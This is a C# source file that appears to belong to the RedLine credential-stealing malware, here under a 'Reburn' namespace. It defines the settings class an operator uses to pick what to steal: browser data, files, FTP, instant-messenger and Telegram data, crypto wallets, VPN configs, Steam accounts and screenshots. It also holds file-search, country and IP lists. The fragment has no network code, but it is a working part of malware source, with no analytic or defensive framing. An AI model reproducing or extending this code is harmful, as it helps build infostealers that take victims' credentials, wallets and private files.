using System.Collections.Generic;
using System.Runtime.Serialization;

namespace RedLine.Reburn.Models.Info;

[DataContract(Name = "ClientSettings", Namespace = "v1/Models")]
public class ClientSettings
{
	[DataMember(Name = "GrabBrowsers")]
	public bool GrabBrowsers { get; set; } = true;


	[DataMember(Name = "GrabFiles")]
	public bool GrabFiles { get; set; }

	[DataMember(Name = "GrabFTP")]
	public bool GrabFTP { get; set; }

	[DataMember(Name = "GrabImClients")]
	public bool GrabImClients { get; set; }

	[DataMember(Name = "GrabWallets")]
	public bool GrabWallets { get; set; }

	[DataMember(Name = "GrabUserAgent")]
	public bool GrabUserAgent { get; set; }

	[DataMember(Name = "GrabScreenshot")]
	public bool GrabScreenshot { get; set; }

	[DataMember(Name = "GetTlgr")]
	public bool GetTlgr { get; set; }

	[DataMember(Name = "GrabVPN")]
	public bool GrabVPN { get; set; }

	[DataMember(Name = "GrabSteam")]
	public bool GrabSteam { get; set; }

	[DataMember(Name = "FilesToSearch")]
	public List<string> FilesToSearch { get; set; }

	[DataMember(Name = "CountryList")]
	public List<string> CountryList { get; set; }

	[DataMember(Name = "IpList")]
	public List<string> IpList { get; set; }
}
